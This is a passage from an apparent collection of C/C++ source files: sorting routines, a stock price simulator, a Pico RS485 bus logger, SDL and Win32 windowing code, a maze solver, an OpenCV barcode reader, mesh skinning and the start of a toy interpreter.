second_array_size) {\n        if (first_array[first_array_index] <= second_array[second_array_index]) {\n            array[merged_array_index] = first_array[first_array_index];\n            ++first_array_index;\n        } else {\n            array[merged_array_index] = second_array[second_array_index];\n            ++second_array_index;\n        }\n        ++merged_array_index;\n    }\n\n    while (first_array_index < first_array_size) {\n        array[merged_array_index] = first_array[first_array_index];\n        ++first_array_index;\n        ++merged_array_index;\n    }\n\n     while (second_array_index < second_array_size) {\n        array[merged_array_index] = second_array[second_array_index];\n        ++second_array_index;\n        ++merged_array_index;\n    }\n\n    delete[] first_array;\n    delete[] second_array;\n}\n\nvoid HeapSort(double array[], int array_size) {\n    for (int i = array_size / 2 - 1; i >= 0; --i) {\n        Heapify(array, array_size, i);\n    }\n\n    for (int i = array_size - 1; i > 0; --i) {\n        std::swap(array[0], array[i]);\n        Heapify(array, i, 0);\n    }\n\n}\nvoid Heapify(double array[], int array_size, int index) {\n    int largest = index;\n    int left = 2 * index + 1;\n    int right = 2 * index + 2;\n\n    if (left < array_size && array[left] < array[largest]) {\n        largest = left;\n    }\n\n    if (right < array_size && array[right] < array[largest]) {\n        largest = right;\n    }\n\n    if (largest != index) {\n        std::swap(array[index], array[largest]);\n        Heapify(array, array_size, largest);\n    }\n}",
    "// stock.cpp  \n#include \"stock.h\"  \n#include <cmath>  \n#include <random>  \n#include <iostream>  \n\n// \u8f85\u52a9\u51fd\u6570  \ndouble generateGaussianNoise(double mu, double sigma) {\n    static std::random_device rd;\n    static std::mt19937 gen(rd());\n    std::normal_distribution<> d(mu, sigma);\n    return d(gen);\n}\n\ndouble simulateStockPrice(double S0, double mu, double sigma, double dt, int steps) {\n    double S = S0;\n    for (int i = 0; i < steps; ++i) {\n        double noise = generateGaussianNoise(0, 1);\n        S *= exp((mu - 0.5 * sigma * sigma) * dt + sigma * std::sqrt(dt) * noise);\n    }\n    return S;\n}\n\n// \u6784\u9020\u51fd\u6570  \nStock::Stock(const std::string& code, const std::string& name, double initial_price)\n    : code(code), name(name), initial_price(initial_price), current_price(initial_price), change(0.0) {\n    record_price_history(initial_price, \"Initial Price\");\n}\n\n// \u6210\u5458\u51fd\u6570\u7684\u5b9a\u4e49  \nstd::string Stock::get_code() const {\n    return code;\n}\n\nstd::string Stock::get_name() const {\n    return name;\n}\n\ndouble Stock::get_initial_price() const {\n    return initial_price;\n}\n\ndouble Stock::get_current_price() const {\n    return current_price;\n}\n\nvoid Stock::set_current_price(double price) {\n    double previous_price = current_price;\n    last_price = previous_price; // \u66f4\u65b0\u4e0a\u4e00\u6b21\u7684\u4ef7\u683c\u4e3a\u5f53\u524d\u4ef7\u683c\n    current_price = price;\n\n    // \u8ba1\u7b97\u5e76\u5b58\u50a8\u4ece\u4e0a\u4e00\u6b21\u4ef7\u683c\u5230\u5f53\u524d\u4ef7\u683c\u7684\u53d8\u5316\u767e\u5206\u6bd4  \n    if (last_price != 0.0) {\n        Stock::change = ((current_price - last_price) / last_price) * 100.0;\n    }\n    last_price = current_price; // \u66f4\u65b0\u4e0a\u4e00\u6b21\u7684\u4ef7\u683c\u4e3a\u5f53\u524d\u4ef7\u683c   \n}\n\ndouble Stock::get_change_since_last_update() const {\n    return change;\n}\n\ndouble Stock::get_change() const {\n    return change;\n}\n\nvoid Stock::record_price_history(double price, const std::string& timestamp) {\n    price_history.push_back(std::make_pair(price, timestamp));\n}\n\nvoid Stock::update_price(double mu, double sigma, double dt, int steps) {\n    double new_price = simulateStockPrice(current_price, mu, sigma, dt, steps);\n    set_current_price(new_price);\n}\n",
    "#include <stdio.h>\n#include \"pico/stdlib.h\"\n#include <hardware/gpio.h>\n#include <hardware/uart.h>\n#include \"crc.h\"\n\n#define RS485_RX_PIN  21\n#define RS485_TX_PIN  20\n\nvolatile bool ledState = true;\n\nint main() {\n    stdio_init_all();\n\n    gpio_init(PICO_DEFAULT_LED_PIN);\n    gpio_set_dir(PICO_DEFAULT_LED_PIN, GPIO_OUT);\n    gpio_put(PICO_DEFAULT_LED_PIN, 1);\n\n    uart_init(uart1, 38400);\n    gpio_set_function(RS485_RX_PIN, GPIO_FUNC_UART);\n    gpio_set_function(RS485_TX_PIN, GPIO_FUNC_UART);\n\n    \n\n    while (true) {\n        // Wait for a null bute\n        uint8_t byte;\n        do { uart_read_blocking(uart1, &byte, 1); }\n        while (byte);\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 0);\n        uint64_t timestamp = time_us_64();\n\n        // Read the destination\n        uint8_t dest;\n        uart_read_blocking(uart1, &dest, 1);\n\n        // Print header\n        uint32_t us = timestamp % 1000000;\n        uint32_t s = timestamp / (uint64_t)1000000;\n        uint32_t m = s / 60;\n        uint32_t h = m / 60;\n        printf(\"%c %02d:%02d:%02d.%06d \", (dest == 0x05)?'>':'<', h%24, m%60, s%60, us);\n        \n        // Read 0x7E\n        uart_read_blocking(uart1, &byte, 1);\n        //printf(\"7E \");\n\n        // Read data until next 0x7E\n        while (true) {\n            uart_read_blocking(uart1, &byte, 1);\n            if (byte == 0x7E) { break; }\n            printf(\"%02X\", byte);\n        }\n        //printf(\"7E \");\n        printf(\"\\n\");\n\n        gpio_put(PICO_DEFAULT_LED_PIN, 1);\n    }\n    return 0;\n}",
    "#include \"Game.h\"\n#include \"Configs.h\"\n#include \"SDL.h\"\n#include <iostream>\n#include \"SDLRenderWrapper.h\"\n\nGame::Game()\n{\n\tlast_frame_time = 0;\n\trender = std::make_shared<SDLRenderWrapper>(WINDOW_TITLE, WINDOW_WIDTH, WINDOW_HEIGHT, WINDOW_FULLSCREEN);\n\tinputHandle = std::make_shared<InputHandler>();\n\n\tinGameState = std::make_shared<InGameState>(std::move(this), render);\n\tmenuState = std::make_shared<MenuState>(std::move(this), render);\n\tloseState = std::make_shared<LoseState>(std::move(this), render);\n\n\tinputHandle->RegisterObserver(this);\n\tSwitchState(menuState);\n}\n\nvoid Game::Update()\n{\n\t// Calculate delta time\n\tUint32 currentTicks = SDL_GetTicks();\n\tfloat deltaTime = (currentTicks - last_frame_time) / 1000.0f; // Convert milliseconds to seconds\n\tlast_frame_time = currentTicks;\n\n\tinputHandle->HandleEvents();\n\tcurrentState->Update(deltaTime);\n\trender->UpdateRender();\n\t\n\twhile (!SDL_TICKS_PASSED(SDL_GetTicks(), last_frame_time + FRAME_TARGET_TIME));\n}\n\nvoid Game::OnQuitWindowClick()\n{\n\tRunning = false;\n}\n\nvoid Game::SwitchState(std::shared_ptr<GameStateBase> newState)\n{\n\tinputHandle->RemoveObserver(currentState.get());\n\tif(currentState)\n\t\tcurrentState->OnExit();\n\tinputHandle->RegisterObserver(newState.get());\n\tcurrentState = newState;\n\tcurrentState->OnEnter();\n}\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n/*\n\n    // Topic-> Vectors\n    1. push_back()\n    2. pop_back()\n    3. size()\n    4. resize()\n    5. begin()\n    6. end()\n    7. clear()\n    8. empty()\n    9. erase()\n    10. insert()\n    11. reverse()\n    12. sort()\n\n*/\nint main()\n{\n    vector<int> v;\n    // push_back()\n    v.push_back(4); // 4\n    v.push_back(5); // 4 5\n    v.push_back(6); // 4 5 6\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n\n    // size()\n    cout<<v.size()<<endl; // 3\n    \n    // pop_back()\n    v.pop_back(); // 4 5\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n    cout<<v.size()<<endl; // 2\n    \n    // resize();\n    v.resize(5); // 4 5 0 0 0 \n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n    v.resize(2); // 4 5\n\n    // begin() & end()\n    cout<<*(v.begin())<<endl; // 4\n    cout<<*(v.begin()+1)<<endl; // 5 \n    cout<<*(v.end()-1)<<endl; // 5\n    \n    // erase()\n    v.push_back(6); // 4 5 6\n    v.push_back(7); // 4 5 6 7\n    v.push_back(9); // 4 5 6 7 9\n    v.push_back(10); // 4 5 6 7 9 10\n    v.push_back(11); // 4 5 6 7 9 10 11\n    \n    v.erase(v.begin()+2); // erase one element {4 5 7 9 10 11}\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n\n    v.erase(v.begin()+1, v.begin()+3); // erase range {4 9 10 11}\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n\n    // insert()\n    v.insert(v.begin()+2, 8); // 4 9 8 10 11\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n\n    // reverse()\n    reverse(v.begin(),v.end()); // 11 10 8 9 4\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n\n    // sort()\n    sort(v.begin(), v.end()); // 4 8 9 10 11\n    for(int i=0; i<v.size(); i++) cout<<v[i]<<\" \";\n    cout<<endl;\n\n    // clear() & empty()\n    v.clear();// Empty vector \n    cout<<v.size()<<endl; // 0\n    \n    if(v.empty()){\n        cout<<\"Empty\"<<endl;\n    }\n    else{\n        cout<<\"Not Empty\"<<endl;\n    }\n\n    \n\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bloc_learning_path\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nbool isSafe(int x, int y, int row, int col, int arr[3][3], vector<vector<bool>> &visited)\r\n{\r\n   if (((x >= 0 && x < row) && (y >= 0 && y < col)) && (arr[x][y] == 1) && (visited[x][y] == false))\r\n   {\r\n      return true;\r\n   }\r\n   else\r\n   {\r\n      return false;\r\n   }\r\n}\r\n\r\nvoid solveMaze(int arr[3][3], int row, int col, int i, int j, vector<vector<bool>> &visited, vector<string> &path, string output)\r\n{\r\n   // base case\r\n   if (i == row - 1 && j == col - 1)\r\n   {\r\n      // answer found\r\n      path.push_back(output);\r\n      return;\r\n   }\r\n   // Down ka 1->case solved karna hai (i+1 , j)\r\n\r\n   if (isSafe(i + 1, j, row, col, arr, visited))\r\n   {\r\n      visited[i + 1][j] = true;\r\n      solveMaze(arr, row, col, i + 1, j, visited, path, output + 'D');\r\n      // backtrack\r\n      visited[i + 1][j] = false;\r\n   }\r\n\r\n   // Left ka 1->case solved karna hai (i,j-1)\r\n\r\n   if (isSafe(i, j - 1, row, col, arr, visited))\r\n   {\r\n      visited[i][j - 1] = true;\r\n      solveMaze(arr, row, col, i, j - 1, visited, path, output + 'L');\r\n      // backtrack\r\n      visited[i][j - 1] = false;\r\n   }\r\n\r\n   // Right ka  1->case solved karna hai (i,j+1)\r\n\r\n   if (isSafe(i, j + 1, row, col, arr, visited))\r\n   {\r\n      visited[i][j + 1] = true;\r\n      solveMaze(arr, row, col, i, j + 1, visited, path, output + 'R');\r\n      // backtrack\r\n      visited[i][j + 1] = false;\r\n   }\r\n\r\n   // Up ka  1->case solved karna hai (i-1,j)\r\n\r\n   if (isSafe(i - 1, j, row, col, arr, visited))\r\n   {\r\n      visited[i - 1][j] = true;\r\n      solveMaze(arr, row, col, i - 1, j, visited, path, output + 'U');\r\n      // backtrack\r\n      visited[i - 1][j] = false;\r\n   }\r\n}\r\n\r\nint main()\r\n{\r\n   int arr[3][3] = {{1, 0, 0},\r\n                    {1, 1, 0},\r\n                    {1, 1, 1}};\r\n   int row = 3;\r\n   int col = 3;\r\n\r\n   vector<vector<bool>> visited(row, vector<bool>(col, false));\r\n\r\n   // source ki value ko true markes karne k liye\r\n\r\n   visited[0][0] = true;\r\n\r\n   vector<string> path;\r\n   string output = \"\";\r\n\r\n   solveMaze(arr, row, col, 0, 0, visited, path, output);\r\n\r\n   cout << \"printing the result \" << endl;\r\n   for (auto i : path)\r\n   {\r\n      cout << i << \" \";\r\n   }\r\n   cout << endl;\r\n   return 0;\r\n}",
    "// Track_Detector.cpp : This file contains the 'main' function. Program execution begins and ends there.\r\n//\r\n#include <iostream>\r\n#include <vector>\r\n#include <opencv2/opencv.hpp>\r\n#include <opencv2/core/core.hpp>\r\n#include <opencv2/highgui/highgui.hpp>\r\n#include <opencv2/imgproc.hpp>\r\n#include <string>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\nusing namespace cv;\r\nconst char* image_window = \"Source Image\";\r\n//const char* result_window = \"Result window\";\r\nint font_size = 1;\r\nScalar font_color(0, 0, 0);\r\nint font_weight = 2;\r\n\r\nvoid save(Mat image,string path) {\r\n    bool isSuccess = imwrite(path, image);\r\n    if (isSuccess == false) {\r\n        cout << \"Failed to save image\" << endl;\r\n        cin.get();\r\n    }\r\n    else {\r\n        cout << \"Image saved\" << endl;\r\n    }\r\n}\r\n\r\nint** TemplateMatching(Mat source, Mat templ, int objectNum) {\r\n    int** arr = new int* [objectNum];\r\n    Mat result;\r\n    double minVal;\r\n    double maxVal;\r\n    Point minLoc;\r\n    Point matchLoc;\r\n    Point maxLoc;\r\n    int j = 0;\r\n    for (int k = 0; k < objectNum; k++, j++) {\r\n        matchTemplate(source, templ, result, TM_SQDIFF_NORMED);\r\n        minMaxLoc(result, &minVal, &maxVal, &minLoc, &maxLoc, Mat());\r\n        matchLoc = minLoc;\r\n        arr[k] = new int[objectNum];\r\n        arr[k][0] = matchLoc.x;\r\n        arr[k][1] = matchLoc.y;\r\n        for (int i = 0; i < templ.cols; i++) {\r\n            for (int j = 0; j < templ.rows; j++) {\r\n                source.at<Vec2b>(matchLoc.y + j, (matchLoc.x + i) / 2) = 0;\r\n            }\r\n        }\r\n    }\r\n    return arr;\r\n}\r\n\r\nint Table(int binary) {\r\n    switch (binary) {\r\n    case(21100001):\r\n        return 1;\r\n        break;\r\n    case(21010010):\r\n        return 2;\r\n        break;\r\n    case(10110011):\r\n        return 3;\r\n        break;\r\n    case(20110100):\r\n        return 4;\r\n        break;\r\n    case(11010101):\r\n        return 5;\r\n        break;\r\n    case(11100110):\r\n        return 6;\r\n        break;\r\n    case(20000111):\r\n        return 7;\r\n        break;\r\n    case(11111000):\r\n        return 8;\r\n        break;\r\n    case(20011001):\r\n        return 9;\r\n        break;\r\n    case(20101010):\r\n        return 0;\r\n        break;\r\n    default:\r\n        return 0;\r\n        break;\r\n    }\r\n}\r\n\r\nvoid Barcode(Mat source, int x, int y, Mat templ) {\r\n    int barcode[80];\r\n    memset(barcode, 0, sizeof(barcode));\r\n    int textNum[10];\r\n    memset(textNum, 0, sizeof(textNum));\r\n    int adjust;\r\n    std::ostringstream oss;\r\n    for (int N = 0; N < 2; N++) {\r\n        int test = 0;\r\n        int index = 0;\r\n        int count = 0;\r\n        int width = 29;\r\n        int norm = 12;\r\n        int threshold = 100;\r\n        while (index != 100) {\r\n            test = int(source.at<Vec2b>(y + index, x / 2 + 66 - N * 44)[0]);\r\n            if (test < threshold - 10 && test > 50) {\r\n                count += 1;\r\n            } //makes sure its a barcode value and not random black dot\r\n            if (count > 2 && test > threshold - 20) {  //found barcode\r\n                for (int i = 0; i < 40; i++) {//barcode sections\r\n                    for (int n = 0; n < 29; n++) {//each section value\r\n                        barcode[i + N * 40] += source.at<Vec2b>(y + index - count / 2 - norm + i * 29 + n, x / 2 + 66 - N * 44)[0];\r\n                    }//total value of each section\r\n                    if (barcode[i + N * 40] / width > threshold) {\r\n                        barcode[i + N * 40] = 0;\r\n                    }\r\n                    else {\r\n                        barcode[i + N * 40] = 1;\r\n                    }\r\n                }\r\n                index = 100;\r\n            }\r\n            else {\r\n                index += 1;\r\n            }\r\n        }\r\n    }\r\n    for (int i = 0; i < 10; i++) {\r\n        for (int j = 0; j < 8; j++) {\r\n            if (j == 0) {\r\n                adjust = 1;\r\n            }\r\n            else {\r\n                adjust = 0;\r\n            }\r\n            textNum[i] += (barcode[i * 8 + j] + adjust) * pow(10, 7 - j);\r\n        }\r\n        textNum[i] = Table(textNum[i]);\r\n    }\r\n    oss << \"Photo: \" << textNum[1] << textNum[2] << textNum[3] << textNum[4] << \"; Roll: \" << textNum[6] << textNum[7] << textNum[8] << textNum[9] << \"; Cam: \" << textNum[5] << \"; Expan: \" << textNum[0];\r\n    std::string var = oss.str();\r\n    Point text_position(source.cols / 2, y / 2);\r\n    putText(source, var, text_position, FONT_HERSHEY_COMPLEX, font_size, font_color, font_weight);\r\n}\r\n\r\nvoid find_track(Mat source,int x, int y) {\r\n    int j = 0;\r\n    int count = 0;\r\n    int test;\r\n    //rectangle(source, Point(500, 500), Point(600, 600), Scalar(0, 0, 255));\r\n    while (j == 0) {\r\n        test = int(source.at<Vec2b>(y + count, x)[0]);\r\n        cout << count << endl;\r\n        if (test < 90 && test > 50) {\r\n            rectangle(source,Point(y+count,x),Point(y + count + 100,x + 100),Scalar(0,255,255));\r\n            j = 1;\r\n        }\r\n        count += 1;\r\n        if (count > 1000) {\r\n            rectangle(source, Point(y + count, x), Point(y ",
    "#include <windows.h>\n\n#define internal static\n#define local_persist static\n#define global_variable static\n\n// Todo: Global for now\nglobal_variable bool Running;\nglobal_variable BITMAPINFO BitmapInfo;\nglobal_variable void *BitmapMemory;\nglobal_variable HBITMAP BitmapHandle;\nglobal_variable HDC BitmapDeviceContext;\n\ninternal void Win32ResizableDBISection(int width, int height) {\n  // todo: bulletproof this\n  // maybe dont free first, free after, then free first if that fails.\n  \n  if (BitmapHandle) {\n    DeleteObject(BitmapHandle);\n  }\n  if (!BitmapDeviceContext) {\n    // todo: should we recreate these under certain circumstances\n    BitmapDeviceContext = CreateCompatibleDC(nullptr);\n  }\n  \n  BitmapInfo.bmiHeader.biSize = sizeof(BitmapInfo.bmiHeader);\n  BitmapInfo.bmiHeader.biWidth = width;\n  BitmapInfo.bmiHeader.biHeight = height;\n  BitmapInfo.bmiHeader.biPlanes = 1;\n  BitmapInfo.bmiHeader.biBitCount = 32;\n  BitmapInfo.bmiHeader.biCompression = BI_RGB;\n  \n  BitmapHandle = CreateDIBSection(\n      BitmapDeviceContext, &BitmapInfo,\n      DIB_RGB_COLORS,\n      &BitmapMemory,\n      0, 0);\n}\n\ninternal void Win32UpdateWindow(HDC DeviceContext, int X, int Y, int Width, int Height) {\n  StretchDIBits(\n      DeviceContext,\n      X, Y, Width, Height,\n      X, Y, Width, Height,\n      BitmapMemory,\n      &BitmapInfo,\n      DIB_RGB_COLORS, SRCCOPY);\n}\n\nLRESULT CALLBACK Win32MainWindowCallback(HWND Window,\n                                         UINT Message,\n                                         WPARAM WParam,\n                                         LPARAM LParam) {\n  \n  LRESULT Result = 0;\n  \n  switch (Message) {\n    case WM_SIZE: {\n      RECT ClientRect;\n      GetClientRect(Window, &ClientRect);\n      int Width = ClientRect.right - ClientRect.left;\n      int Height = ClientRect.bottom - ClientRect.top;\n      Win32ResizableDBISection(Width, Height);\n    }\n      break;\n    case WM_CLOSE: {\n      // Todo - handle this with a message to user\n      Running = false;\n    }\n      break;\n    case WM_ACTIVATEAPP: {\n      OutputDebugStringA(\"WM_ACTIVATEAPP\\n\");\n    }\n      break;\n    case WM_DESTROY: {\n      // todo: handle this as an error. Recreate window\n      Running = false;\n    }\n      break;\n    \n    case WM_PAINT: {\n      PAINTSTRUCT Paint;\n      HDC DeviceContext = BeginPaint(Window, &Paint);\n      int X = Paint.rcPaint.left;\n      int Y = Paint.rcPaint.top;\n      int Width = Paint.rcPaint.right - Paint.rcPaint.left;\n      int Height = Paint.rcPaint.bottom - Paint.rcPaint.top;\n      Win32UpdateWindow(BitmapDeviceContext, X, Y, Width, Height);\n      EndPaint(Window, &Paint);\n    }\n      break;\n    \n    default: {\n//      OutputDebugStringA(\"default\\n\");\n      Result = DefWindowProcA(Window, Message, WParam, LParam);\n    }\n      break;\n  }\n  return (Result);\n}\n\nint CALLBACK WinMain(HINSTANCE Instance, HINSTANCE PrevInstance,\n                     LPSTR CommandLine, int ShowCode) {\n  \n  WNDCLASS WindowClass = {};\n  \n  // Todo: Check Validity of owndc/ hredraw/ vredraw\n  WindowClass.style = CS_OWNDC | CS_HREDRAW | CS_VREDRAW;\n  WindowClass.lpfnWndProc = Win32MainWindowCallback;\n  WindowClass.hInstance = Instance;\n  //    WindowClass.hIcon;\n  WindowClass.lpszClassName = \"ParacosmicWindowsClass\";\n  \n  if (RegisterClass(&WindowClass)) {\n    HWND WindowHandle = CreateWindowEx(\n        0,\n        WindowClass.lpszClassName,\n        \"Paracosmic\",\n        WS_OVERLAPPEDWINDOW | WS_VISIBLE,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        CW_USEDEFAULT,\n        nullptr,\n        nullptr,\n        Instance,\n        nullptr);\n    if (WindowHandle) {\n      Running = true;\n      \n      while (Running) {\n        MSG Message;\n        BOOL MessageResult = GetMessageA(&Message, nullptr, 0, 0);\n        if (MessageResult > 0) {\n          TranslateMessage(&Message);\n          DispatchMessage(&Message);\n        } else {\n          break;\n        }\n      }\n#pragma clang diagnostic pop\n      \n    } else {\n    \n    }\n  } else {\n    // TODO: logging\n  }\n  \n  return (0);\n}\n",
    "#include \"skinnedcharacter.h\"\r\n\r\n//==============================================================================================//\r\n\r\nusing namespace Eigen;\r\n\r\n//==============================================================================================//\r\n\r\nskinnedcharacter::skinnedcharacter()\r\n{\r\n\tm_timestamp = -1;\r\n\tm_skinMesh = NULL;\r\n\tm_sourceMesh = NULL;\r\n\tm_skeleton = NULL;\r\n\tm_deformed = false;\r\n}\r\n\r\n//==============================================================================================//\r\n\r\nskinnedcharacter::~skinnedcharacter()\r\n{\r\n\tdelete m_skinMesh;\r\n\tdelete m_sourceMesh;\r\n}\r\n\r\n//==============================================================================================//\r\n\r\nvoid skinnedcharacter::update()\r\n{\r\n\t// check whether we actually need to update the surface model at all\r\n\tif (m_skeleton->getTimeStamp() == m_timestamp)\r\n\t\treturn;\r\n\tm_timestamp = m_skeleton->getTimeStamp();\r\n\r\n\tfor (size_t i = 0; i < m_joint.size(); i++)\r\n\t{\r\n\t\tfloat sc = 1.0f;\r\n\r\n\t\tif (m_joint[i]->getChildren().size() > 0)\r\n\t\t\tsc = m_joint[i]->getChildren()[0]->getScale();\r\n\t\telse\r\n\t\t\tsc = m_joint[i]->getBase()->getScale();\r\n\r\n\t\tAffine3f scale;\r\n\t\tscale.matrix() << sc, 0, 0, 0, 0, sc, 0, 0, 0, 0, sc, 0, 0, 0, 0, 1;\r\n\t\tm_jointTransformations[i] = m_joint[i]->getTransformation() * scale * m_initialTransformations[i];\r\n\t}\r\n\r\n\t// check whether to use Dual Quaternions or not\r\n\tconst bool useDualQuaternions = m_skeleton->getUseDualQuaternions();\r\n\r\n\tfor (size_t i = 0; i < m_skinMesh->getNrVertices(); i++)\r\n\t{\r\n\t\t// temporals\r\n\t\tconst Vector3f& op = m_sourceMesh->getVertex(i);\r\n\t\tconst Vector3f& on = m_sourceMesh->getNormal(i);\r\n\r\n\t\tVector3f p(Vector3f::Zero());\r\n\t\tVector3f n(Vector3f::Zero());\r\n\r\n\t\tDualQuaternion b(0.0);\t\t// compute the dual quaternion b (see main paper)\r\n\t\tDualQuaternion dq_first;\t// first dual quaternion computed for this vertex\r\n\r\n\t\tfor (size_t j = 0; j < m_skindata[i].size(); j++)\r\n\t\t{\r\n\t\t\tif (useDualQuaternions)\r\n\t\t\t{\r\n\t\t\t\tDualQuaternion dq = DualQuaternion(m_jointTransformations[m_skindata[i][j].index].rotation(), m_jointTransformations[m_skindata[i][j].index].translation());\r\n\t\t\t\tfloat sign = 1.0f;\r\n\t\t\t\tif (j == 0)\r\n\t\t\t\t\tdq_first = dq; // store the first dual quaternion for this vertex\r\n\t\t\t\telse if (dq_first.getRotationQuaternion().dot(dq.getRotationQuaternion()) < 0.0f)\r\n\t\t\t\t\tsign = -1.0f; // change the sign seeking for shortest rotation\r\n\r\n\t\t\t\tb = b + (dq * m_skindata[i][j].weight * sign);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tVector3f tmp = m_skindata[i][j].weight * (m_jointTransformations[m_skindata[i][j].index].matrix() * op.homogeneous());\r\n\t\t\t\tp += tmp;\r\n\t\t\t\tn += m_skindata[i][j].weight * (m_jointTransformations[m_skindata[i][j].index].matrix().block<3, 3>(0, 0) * on);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\t// compute the new vertex position\r\n\t\tif (useDualQuaternions)\r\n\t\t{\r\n\t\t\tb.normalize();\r\n\t\t\tMatrix3f R; Vector3f t;\r\n\t\t\tb.toTransformation(R, t);\r\n\t\t\tm_skinMesh->setVertex(i, R * op + t);\r\n\t\t\tm_skinMesh->setNormal(i, (R * on).normalized());\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tm_skinMesh->setVertex(i, p);\r\n\t\t\tm_skinMesh->setNormal(i, n.normalized());\r\n\t\t}\r\n\t}\r\n\tm_deformed = false;\r\n}\r\n\r\n//==============================================================================================//\r\n\r\nvoid skinnedcharacter::update_deformation()\r\n{\r\n\tif (m_deformed && m_skeleton->getUseDualQuaternions())\r\n\t{\r\n\t\tfor (size_t i = 0; i < m_skinMesh->getNrVertices(); i++)\r\n\t\t{\r\n\t\t\t// vertices from template\r\n\t\t\tconst Vector3f& op = m_sourceMesh->getVertex(i);\r\n\t\t\tconst Vector3f& on = m_sourceMesh->getNormal(i);\r\n\t\t\t// apply per-vertex deformation. NOTE rotation matrix is trasposed.\r\n\t\t\tm_skinMesh->setVertex(i, m_Rs[i] * op + m_ts[i]);\r\n\t\t\tm_skinMesh->setNormal(i, (m_Rs[i] * on).normalized());\r\n\r\n\t\t}\r\n\t\tm_deformed = false;\r\n\t}\r\n}\r\n\r\n//==============================================================================================//\r\n\r\nvoid skinnedcharacter::loadSkinningData(std::vector<std::vector<skindata>>& skindata, std::vector<abstract_joint*>& joints, std::vector<std::string>& skinBoneNames)\r\n{\r\n\t// update temporal list of joint and joint transformations\r\n\tm_joint.clear();\r\n\tm_jointTransformations.clear();\r\n\tm_initialTransformations.clear();\r\n\tm_skinBoneNames.clear();\r\n\r\n\tfor (size_t i = 0; i<joints.size(); i++)\r\n\t{\r\n\t\tabstract_joint* jt = joints[i];\r\n\t\tm_joint.push_back(jt);\r\n\t\tm_jointTransformations.push_back(jt->getTransformation());\r\n\t\tm_initialTransformations.push_back((jt->getTransformation()).inverse());\r\n\t\tm_skinBoneNames.push_back(skinBoneNames[i]);\r\n\t}\r\n\r\n\t// update the skindata\r\n\tm_skindata.clear();\r\n\tm_skindata = skindata;\r\n}\r\n\r\n//==============================================================================================//\r\n\r\nvoid skinnedcharacter::loadSkinningData(const char* filename)\r\n{\r\n\tstd::ifstream fh;\r\n\tfh.open(filename, std::ifstream::in);\r\n\r\n\tif (fh.fail())\r\n\t\tstd::cout << errorStart << \"loadSkinningData: File not found.\" << errorEnd;\r\n\r\n\t// some state variables\r\n\tstd::vector<std::string> tokens;\r\n\r\n\t// read header\r\n\tif (!ge",
    "// This is preliminary experiment for C++ Frame Engine Project\n\n// Project status: toy\n// Requires: C++23 is the target. seriously. need features. absolutely. minimal support is llvm17 -std=c++23\n// Author: The Old Man\n// License: Public Domain\n// Flaws: it's a demonstrator of mechanics design. for the sake of explanation clarity, it does not care about exceptions. don't use for production\n\n#include <iostream>\n#include <string>\n#include <sstream>\n#include <iomanip>\n#include <utility>\n#include <initializer_list>\n\n#include <deque>\n#include <stack>  \n#include <map>\n#include <list>\n\n// Frame.\n// Frame is a fundamental concept here\n// This one is an exemplary frame, not generic one. in project, frame will become a templated abstraction \n// Frame is a closure for a frame-specific language. we construct an interpreter for that language\n//   - the language construction here is not part of the frame by design, to demonstrate ability to augment foreign c++ objects for scripting.\n//   - interpreter endorsing the frame has two layers: outer, which uses symbols and inner, which uses atoms\n//   - at first glance, symbolic language constructed in this demonstrator may look like Forth, but it is not.\n//     it is not structured. it has numerals but no literals. it has no flow control. it is not Turing-complete. it is not recursive.\n//     it reflects C++ functions, by declarations. consider it rather imperative command language, like JCL or Unix shells. this is by design.\n//   - we call specific execution model represented by constructed interpreter a Frame Machine\n// Frame-related primitives may be global/external functions or functions templates, operating on frame or independently callable \n//    this is demonstrated by process control and RPN arithmetic mechanic on frame's data stack container\n// Alternatively, a frame may provide its own primitive methods \n//    this is demonstrated by boolean flag indicator which is an embedded part of frame\n// Very large frames could provide their own exposed primitives vocabulary suitable for frame composition\n//    this is not demonstrated here yet\n// Generally we combine operators on frame and operators on structures embedded in frame into one symbolic language\n//    finally, a simple console is implemented for play with the frame. This makes whole contraption looking like an interpreter\n\nclass FRAME {\npublic:\n  std::stack<int> data_stack; // forth-like RPN arithmetic data stack\n  // in c++ standard, std::stack is an adapter to std::deque, which is (by standard) already a tree, for adequate complexity.\n  // therefore, we recommend using deque for more advanced structured 